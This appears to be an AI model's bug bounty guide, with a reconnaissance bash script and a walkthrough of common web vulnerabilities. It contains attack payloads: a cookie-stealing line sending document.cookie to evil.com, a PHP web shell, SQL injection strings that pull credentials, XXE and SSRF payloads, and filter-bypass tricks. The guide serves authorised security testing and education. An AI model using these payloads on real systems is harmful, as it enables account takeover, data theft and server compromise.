# Advanced Bug Bounty Hunting Methodology

This methodology builds on your foundational knowledge, diving into technical workflows for finding high-impact vulnerabilities. It’s structured for efficiency and repeatability, drawing from expert practices and tailored for web, API, and mobile targets.


# Create output directory
mkdir -p "$OUTPUT_DIR"

# Step 1: Subdomain Enumeration
echo "[+] Enumerating subdomains for $TARGET..."
amass enum -d "$TARGET" -o "$SUBDOMAIN_FILE" -passive
sublist3r -d "$TARGET" -o "$SUBDOMAIN_FILE.tmp"
cat "$SUBDOMAIN_FILE.tmp" >> "$SUBDOMAIN_FILE"
rm "$SUBDOMAIN_FILE.tmp"

# Step 2: Filter live subdomains
echo "[+] Filtering live subdomains..."
cat "$SUBDOMAIN_FILE" | httprobe > "$SUBDOMAIN_FILE.live"
mv "$SUBDOMAIN_FILE.live" "$SUBDOMAIN_FILE"

# Step 3: URL Crawling
echo "[+] Crawling URLs with Gau..."
gau "$TARGET" --subs --threads 10 > "$URL_FILE"

# Step 4: Port Scanning
echo "[+] Scanning ports with Nmap..."
nmap -iL "$SUBDOMAIN_FILE" -T4 -p- -oN "$OPEN_PORTS_FILE"

# Step 5: Screenshot live hosts
echo "[+] Taking screenshots with EyeWitness..."
EyeWitness -f "$SUBDOMAIN_FILE" -d "$OUTPUT_DIR/screenshots" --web

# Step 6: Basic vuln scan with Nuclei
echo "[+] Running Nuclei for basic vuln checks..."
nuclei -l "$SUBDOMAIN_FILE" -t cves/ -t vulnerabilities/ -o "$OUTPUT_DIR/nuclei_results_$TIMESTAMP.txt"

echo "[+] Recon complete. Results saved in $OUTPUT_DIR"
</xaiArtifact>

---

### Step-by-Step Technical Methodology

#### 1. **Preparation and Target Selection**
- **Choose a Program**: Select a program from platforms like HackerOne, Bugcrowd, or Intigriti based on your expertise (e.g., web apps, APIs). Prioritize programs with broad scopes or recent updates, as they’re less picked over.
- **Understand the Target**:
  - Use the app as a normal user to map functionality (e.g., login, profile, payment flows).
  - Identify tech stack with Wappalyzer or BuiltWith (e.g., Django, GraphQL, AWS).
  - Create multiple accounts (e.g., user, admin) to test role-based access controls.
- **Setup**:
  - Configure Burp Suite Professional (or Community) with extensions like Autorize (for IDOR), Turbo Intruder (for rate-limit bypasses), and Logger++.
  - Use a VPS for external testing (e.g., RFI, SSRF). Recommended: AWS Lightsail or Linode ($5-$10/month).
  - Install recon tools: Amass, Sublist3r, httprobe, Gau, Nuclei, EyeWitness.

#### 2. **Advanced Reconnaissance**
Recon is critical to uncovering hidden assets. Use a layered approach to maximize coverage.

- **Subdomain Enumeration**:
  - **Passive**: Run `amass enum -d target.com -passive` to gather subdomains from OSINT sources (e.g., Certificate Transparency logs, DNS records).
  - **Active**: Use `sublist3r -d target.com` and `dnsrecon -d target.com` for brute-forcing subdomains.
  - **Recursive**: Feed discovered subdomains back into Amass with `amass enum -d subdomain.target.com`.
  - **Filter Live Hosts**: Use `httprobe` or `massdns` to verify live subdomains (`cat subdomains.txt | httprobe > live_subdomains.txt`).

- **Port and Service Discovery**:
  - Run `nmap -iL live_subdomains.txt -T4 -p- -sV -oN ports.txt` to identify open ports and services.
  - Focus on unusual ports (e.g., 8080, 8443) or misconfigured services (e.g., exposed Jenkins on 8080).

- **URL and Endpoint Discovery**:
  - Use `gau target.com --subs` to extract URLs from Wayback Machine, AlienVault, and Common Crawl.
  - Scrape JS files for hidden endpoints: `cat urls.txt | grep "\.js$" | xargs curl -s | grep -oP "\/api\/[^\"']+"`.
  - Check mobile apps (if in scope) by decompiling APKs with `apktool` or analyzing network traffic with Frida.

- **OSINT and Asset Discovery**:
  - Query `crt.sh` for subdomains: `curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r .name_value | sort -u`.
  - Use Shodan/Censys to find exposed servers or cloud assets (e.g., S3 buckets).
  - Search X for program-specific leaks or discussions: `from:target.com bug bounty` or `security@target.com`.

- **Misconfiguration Checks**:
  - Look for exposed `.git`, `wp-config.php`, or `.env` files: `curl -s http://sub.target.com/.git/config`.
  - Test for cloud misconfigs (e.g., `bucket.target.com.s3.amazonaws.com`).

**Output**: Save results in organized folders (e.g., `recon/target.com/subdomains.txt`, `recon/target.com/urls.txt`). Use the provided script for automation.

#### 3. **Vulnerability Discovery**
Test systematically across the attack surface. Combine manual and automated approaches for efficiency.

- **Broken Access Control/IDOR**:
  - Enumerate IDs/UUIDs in requests (e.g., `/api/user/123` → `/api/user/124`).
  - Use Burp’s Autorize to automate privilege escalation tests across roles.
  - Check for horizontal (same-level users) and vertical (user-to-admin) access.
  - Example: Change `user_id=123` to `user_id=124` in API calls; verify PII exposure.

- **Cross-Site Scripting (XSS)**:
  - **Stored**: Inject payloads like `<script>alert(document.cookie)</script>` or polyglots in inputs (e.g., comments, profiles).
    ```javascript:disable-run
    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
    ```
  - **Reflected**: Test query parameters (e.g., `?search=<script>alert(1)</script>`).
  - **DOM-Based**: Use `domdig` or analyze JS with `grep -r "document.write" *.js`.
  - **Blind XSS**: Use a payload server like XSS Hunter (`<script src="https://yoursite.xss.ht"></script>`).
  - **Bypass WAF**: Encode payloads (e.g., `<scr<script>ipt>`), use event handlers (`onerror`, `onmouseover`), or chain with CSRF.

- **Injection Attacks**:
  - **SQL Injection**:
    - Test inputs with payloads like `' OR 1=1--`, `1' UNION SELECT 1,2,3--`.
    - Use `sqlmap` for automation: `sqlmap -u "http://target.com/page?id=1" --batch`.
    - Check for blind SQLi with time-based payloads: `' AND SLEEP(5)--`.
  - **Command Injection**:
    - Test parameters with `;whoami`, `|ping -c 3 yourvps.com`.
    - Use Burp Intruder with payloads like `$(whoami)`, `&& id`.
  - **SSTI (Server-Side Template Injection)**:
    - Inject `{{7*7}}` or `${{7*7}}` in input fields; look for `49` in response.
    - Escalate to RCE with payloads like `{{config.__class__.__init__.__globals__}}` (Flask/Jinja2).

- **CSRF**:
  - Check for missing/invalid tokens: Submit forms with tampered or no tokens.
  - Test token predictability (e.g., static tokens across sessions).
  - Craft PoC HTML:
    ```html
    <form action="http://target.com/update" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com">
      <input type="submit">
    </form>
    ```

- **SSRF (Server-Side Request Forgery)**:
  - Test URL parameters (e.g., `?url=http://localhost`) or file uploads.
  - Target internal services: `http://169.254.169.254` (AWS metadata), `http://internal.target.com`.
  - Use `collaboratorclient` in Burp to detect blind SSRF.

- **XXE (XML External Entity)**:
  - Test XML inputs (e.g., file uploads, API payloads):
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root>&xxe;</root>
    ```
  - Check for blind XXE with out-of-band (OOB) requests to your VPS.

- **API Vulnerabilities**:
  - Use Postman or Burp to test REST/GraphQL APIs.
  - Check for broken object-level authorization (BOLA): Modify `id` in `/api/v1/resource/id`.
  - Test rate limits: Use Turbo Intruder to send rapid requests.
  - Enumerate GraphQL schemas with `graphqlmap`.

- **Business Logic Flaws**:
  - Manipulate workflows (e.g., bypass payment by setting `amount=0`).
  - Test race conditions: Send simultaneous requests with Burp’s Turbo Intruder.
  - Example: Reset password for two accounts concurrently to overwrite tokens.

- **Cloud Misconfigurations**:
  - Test S3 buckets: `curl -s http://bucket.target.com.s3.amazonaws.com`.
  - Check for IAM role abuse in SSRF scenarios.

#### 4. **Chaining Vulnerabilities**
Maximize impact by combining vulnerabilities:
- **XSS + CSRF**: Use XSS to submit CSRF payloads on behalf of users.
- **IDOR + SSRF**: Access internal APIs via SSRF, then exploit IDOR for data leaks.
- **XSS + PII**: Steal sensitive data (GDPR-relevant) via stored XSS.
- **SSTI + RCE**: Escalate SSTI to command execution.
Example: Chain XSS with session theft to hijack admin accounts.

#### 5. **Validation and PoC Development**
- **Prove Impact**:
  - For XSS: Show cookie theft or account takeover.
  - For SQLi: Extract sample data (e.g., usernames).
  - For RCE: Execute `whoami` or read `/etc/passwd`.
- **Tools**:
  - Use Burp Collaborator for OOB testing (e.g., blind XSS, SSRF).
  - Record videos with OBS Studio or screenshots for PoCs.
- **Severity**: Calculate CVSS score (use online calculators) to quantify impact (e.g., Critical for RCE, High for XSS).

#### 6. **Reporting**
Craft professional reports to maximize rewards:
- **Structure**:
  - **Title**: Clear and specific (e.g., “Stored XSS in Profile Page Leading to Account Takeover”).
  - **Description**: Explain the vuln, its impact, and why it matters (e.g., GDPR, financial loss).
  - **Steps to Reproduce**: Numbered steps with URLs, payloads, and screenshots/videos.
  - **Impact**: Quantify (e.g., “Steals 10,000 user sessions”).
  - **PoC**: Include code, HTTP requests, or video links.
  - **Recommendation**: Suggest fixes (e.g., “Implement Content Security Policy for XSS”).
- **Example Report**:
  ```markdown
  # Stored XSS in Comment Section
  **Severity**: High (CVSS 7.5)
  **Description**: A stored XSS vulnerability in the comment section allows attackers to inject malicious JavaScript, executed for all users viewing the page, leading to session theft or account takeover.
  **Steps to Reproduce**:
  1. Navigate to http://target.com/comments.
  2. Post comment: `<script>alert(document.cookie)</script>`.
  3. View comments; observe alert with session cookie.
  **Impact**: Attackers can steal cookies, hijack accounts, or redirect users to malicious sites.
  **PoC**: [Video link or screenshot]
  **Recommendation**: Sanitize inputs with a library like DOMPurify; implement CSP.
  ```
- **Submission**: Use the program’s portal (e.g., HackerOne). Follow up politely if triaged slowly.

#### 7. **Post-Report Actions**
- Monitor for patches; request permission for public disclosure.
- Learn from feedback: Study duplicate reports or rejected submissions to improve.
- Share write-ups (post-patch) on Medium or X to build reputation.

---

### Technical Workflow Example
**Target**: example.com (public program on HackerOne).
1. **Recon**:
   - Run `bash bug_bounty_recon_script.sh example.com recon_output`.
   - Discover `api.example.com` and `dev.example.com`.
   - Find open port 8080 on `dev.example.com` running Jenkins.
2. **Testing**:
   - Intercept requests to `api.example.com/v1/user/123` with Burp.
   - Change to `user/124` → IDOR exposes PII.
   - Test `api.example.com/v1/upload?url=http://localhost` → SSRF hits internal service.
3. **Chaining**:
   - Use SSRF to access `http://internal.example.com/admin`, combine with IDOR to extract admin data.
4. **PoC**:
   - Record video showing SSRF request and PII exposure.
   - Calculate CVSS: 8.6 (High).
5. **Report**:
   - Submit via HackerOne with detailed steps and PoC.
   - Suggest fixes: Input validation for SSRF, parameter binding for IDOR.

---

### Advanced Tools and Techniques
- **Burp Suite Extensions**:
  - **Autorize**: Automate IDOR testing.
  - **Turbo Intruder**: Custom scripts for race conditions or fuzzing.
  - **JSON Web Tokens**: Decode/manipulate JWTs for auth bypasses.
- **Custom Scripts**:
  - Write Python scripts with `requests` for API fuzzing:
    ```python
    import requests
    urls = open("urls.txt").readlines()
    for url in urls:
        r = requests.get(url.strip() + "?test=<script>alert(1)</script>")
        if "alert(1)" in r.text: print(f"XSS in {url}")
    ```
- **Automation Frameworks**:
  - Use Nuclei with custom templates: `nuclei -t custom_templates/idors.yaml -l subdomains.txt`.
  - Automate recon with Bash scripts (see artifact).
- **Cloud-Specific**:
  - Test AWS S3 buckets with `aws s3 ls s3://bucket.target.com --no-sign`.
  - Use `ffuf` for bucket enumeration: `ffuf -u https://FUZZ.target.com.s3.amazonaws.com -w wordlist.txt`.

---

### Best Practices for Scaling
- **Specialize**: Focus on niches like GraphQL, Web3, or IoT. Learn their unique vulns (e.g., GraphQL introspection, smart contract reentrancy).
- **Automate Wisely**: Use tools like Nuclei for low-hanging fruit but prioritize manual testing for high-impact bugs.
- **Stay Updated**: Follow X accounts (@nahamsec, @bugcrowd) and read write-ups on HackerOne or Medium.
- **Network**: Join Discord communities (e.g., Bugcrowd, Intigriti) or attend virtual cons like DEF CON.
- **Legal/Ethical**:
  - Never test out-of-scope assets or use DoS attacks.
  - Report earnings for taxes (consult a professional).
  - Check local laws (e.g., GDPR in EU, CFAA in US).

---

### Common Pitfalls to Avoid
- **Over-Automation**: Automated scans often miss business logic flaws or chained vulns.
- **Scope Violations**: Stick to in-scope assets; testing `*.target.com` when only `app.target.com` is allowed risks bans.
- **Low-Impact Reports**: Avoid submitting self-XSS or missing headers unless explicitly in scope.
- **Poor Reports**: Vague reports (e.g., “XSS found, fix it”) get rejected. Include PoCs and impact.

---

### Rewards and Expectations
- **Payouts** (2025 estimates):
  - Low (e.g., misconfigs): $50-$500.
  - Medium (e.g., XSS, CSRF): $500-$2,000.
  - High/Critical (e.g., RCE, IDOR with PII): $2,000-$100,000+.
- **Reputation**: Leaderboard rankings on HackerOne/Bugcrowd boost invites to private programs.
- **Time Investment**: Expect 20-50 hours of testing per valid bug early on; efficiency improves with experience.

---

### Next Steps
- Practice on CTFs (Hack The Box, TryHackMe) to simulate real-world targets.
- Hunt on VDPs to build skills without legal risks.
- Write a custom tool (e.g., Python script for IDOR fuzzing) to automate repetitive tasks.
- If you want, I can search X for recent bug bounty program announcements or provide a deeper dive into a specific vuln (e.g., SSRF, GraphQL).

This methodology, combined with the provided recon script, should give you a robust framework to find and report high-impact bugs. Let me know if you need help refining the script or focusing on a particular technique!

---

# common web vulnerabilities

### 1. **Cross-Site Scripting (XSS)**
   - **Overview**: Injects malicious scripts for session theft or phishing (Reflected, Stored, DOM-based).
   - **Tools**: Burp Suite, XSStrike.
   - **Steps**:
     1. Find inputs: Forms, URL params, headers.
     2. Inject: `<script>alert(1)</script>` or `javascript:alert(1)`.
     3. Check execution: Look for alerts/DOM changes.
     4. Bypass filters: Try `<scr%00ipt>`, `onerror=alert(1)`.
     5. Automate: XSStrike or Burp Scanner.
     6. Escalate: Show cookie theft (`document.location='http://evil.com?cookie='+document.cookie`).
     7. Report: Payload, steps, impact (e.g., account takeover).

### 2. **SQL Injection (SQLi)**
   - **Overview**: Exploits database queries to extract/modify data.
   - **Tools**: SQLmap, Burp Suite.
   - **Steps**:
     1. Find inputs: Forms, APIs (`?id=1`).
     2. Test errors: Inject `'` or `--`.
     3. Probe: Use `' OR 1=1--`, `' AND SLEEP(5)--`, or `' UNION SELECT 1,2,3--`.
     4. Extract: Try `' UNION SELECT username,password FROM users--`.
     5. Automate: `sqlmap -u "http://target.com/page?id=1" --dbs`.
     6. Bypass: Use encodings, case variations (`UnIoN`).
     7. Report: PoC query, sample data, impact (e.g., DB dump).

### 3. **Insecure Direct Object Reference (IDOR) / Broken Access Control**
   - **Overview**: Access unauthorized data by manipulating references.
   - **Tools**: Burp Suite (Autorize).
   - **Steps**:
     1. Spot IDs: URLs/APIs (`/user/123`, `user_id=123`).
     2. Manipulate: Change ID (123→124) with two accounts.
     3. Verify: Check for unauthorized data access.
     4. Automate: Use Autorize for privilege escalation.
     5. Escalate: Note PII exposure (GDPR).
     6. Report: Screenshots, request, impact (e.g., data leak).

### 4. **Cross-Site Request Forgery (CSRF)**
   - **Overview**: Forges user actions without consent.
   - **Tools**: Burp Suite.
   - **Steps**:
     1. Find actions: POST/GET for state changes (e.g., password update).
     2. Check tokens: Verify presence, uniqueness, validation.
     3. Craft PoC: `<form action="http://target.com/update" method="POST"><input type="hidden" name="email" value="hacker@evil.com"><input type="submit"></form>`.
     4. Test: Host PoC, trick user into clicking.
     5. Bypass: Omit/reuse tokens; test GET methods.
     6. Report: PoC code, video, fix (e.g., CSRF tokens).

### 5. **Server-Side Request Forgery (SSRF)**
   - **Overview**: Makes server send unauthorized requests to internal/external resources.
   - **Tools**: Burp Suite (Collaborator), SSRFmap.
   - **Steps**:
     1. Find entry points: `?url=`, `?file=` in APIs/webhooks.
     2. Test: Inject `http://localhost/` or `http://169.254.169.254/latest/meta-data/`.
     3. Probe: Try `http://192.168.0.1` or `file:///etc/passwd`.
     4. Blind SSRF: Use Collaborator (`http://yourcollaborator.burp/`).
     5. Bypass: Use `2130706433`, `127.0.0.1.nip.io`, or `gopher://`.
     6. Escalate: Chain to RCE or data exfil.
     7. Report: PoC URL, accessed data, impact (e.g., cloud creds).

### 6. **File Upload Vulnerabilities**
   - **Overview**: Uploads malicious files for RCE or XSS.
   - **Tools**: Burp Intruder.
   - **Steps**:
     1. Find uploads: Image/avatar fields.
     2. Test limits: Check allowed types/sizes.
     3. Bypass: Use `shell.php.jpg`, `shell.php%00.jpg`.
     4. Inject: Upload `<?php system($_GET['cmd']); ?>`.
     5. Execute: Access `/uploads/shell.php?cmd=id`.
     6. Report: Request, URL, execution PoC.

### 7. **Broken Authentication**
   - **Overview**: Bypasses login or hijacks sessions.
   - **Tools**: Burp Session Hijacker.
   - **Steps**:
     1. Test flows: Login, logout, reset, MFA.
     2. Check sessions: Verify token changes; test fixation.
     3. Brute-force: Use Intruder on logins; check rate limits.
     4. Reset flaws: Manipulate reset tokens/emails.
     5. Hijack: Swap cookies between accounts.
     6. Report: Video of bypass, impact (e.g., admin access).

### 8. **Open Redirects**
   - **Overview**: Redirects to attacker-controlled URLs.
   - **Tools**: Burp Suite.
   - **Steps**:
     1. Spot params: `redirect`, `next`, `url`.
     2. Inject: Try `http://evil.com`.
     3. Bypass: Use `//evil.com`, `@evil.com`.
     4. Chain: Combine with XSS/CSRF.
     5. Report: PoC URL, phishing risk.

### 9. **Rate Limiting / Brute-Force**
   - **Overview**: Allows unlimited login/API attempts.
   - **Tools**: Burp Intruder.
   - **Steps**:
     1. Find endpoints: Logins, OTPs.
     2. Test bursts: Send 100+ requests.
     3. Check blocks: Look for bans or errors.
     4. Bypass: Rotate IPs, add delays.
     5. Report: Request count, PoC script.

### 10. **Information Disclosure**
    - **Overview**: Leaks configs, creds, or PII.
    - **Tools**: Gau, Nikto.
    - **Steps**:
      1. Enumerate: Scan for `.env`, `.git`.
      2. Check: Review `robots.txt`, backups.
      3. Access: Curl or browse files.
      4. Automate: Run Nikto for leaks.
      5. Report: File URL, exposed data.

---



